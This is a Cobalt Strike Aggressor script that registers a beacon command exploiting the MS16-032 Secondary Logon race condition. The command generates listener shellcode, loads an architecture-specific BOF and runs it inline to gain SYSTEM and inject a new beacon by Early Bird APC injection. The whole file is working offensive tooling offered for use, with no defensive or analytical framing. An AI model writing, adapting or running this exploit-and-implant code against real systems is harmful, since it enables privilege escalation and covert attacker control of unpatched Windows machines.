# MS16-032 BOF — Direct Beacon Injection
alias ms16032_inject {
    local('$barch $handle $data $args $listener $payload');

    if (size(@_) < 2) {
        berror($1, "Usage: ms16032_inject <listener>");
        return;
    }

    $listener = $2;
    $barch    = barch($1);

    # Generate shellcode for the target architecture
    $payload = payload($listener, $barch, "thread");

    if (strlen($payload) == 0) {
        berror($1, "Failed to generate payload — verify listener name: $listener");
        return;
    }

    blog($1, "Generated $barch payload (" . strlen($payload) . " bytes) for listener: $listener");

    # Load architecture-matched BOF
    $handle = openf(script_resource("ms16032_inject." . $barch . ".o"));

    if ($handle is $null) {
        berror($1, "Cannot open ms16032_inject." . $barch . ".o — compile for $barch first");
        return;
    }

    $data = readb($handle, -1);
    closef($handle);

    if (strlen($data) == 0) {
        berror($1, "BOF file is empty");
        return;
    }

    $args = bof_pack($1, "b", $payload);

    btask($1, "MS16-032 LPE -> $listener ($barch)");
    beacon_inline_execute($1, $data, "go", $args);
}

beacon_command_register(
    "ms16032_inject",
    "MS16-032 local privilege escalation with beacon injection",
    "Usage: ms16032_inject <listener>\n\nExploits the MS16-032 race condition in the Secondary Logon service to\nescalate to SYSTEM and inject a new beacon via Early Bird APC injection.\n\nRequirements:\n  - Unpatched target (pre-March 2016 / KB3139914)\n  - 2+ logical processors\n  - SeImpersonatePrivilege (service accounts, administrators)"
);
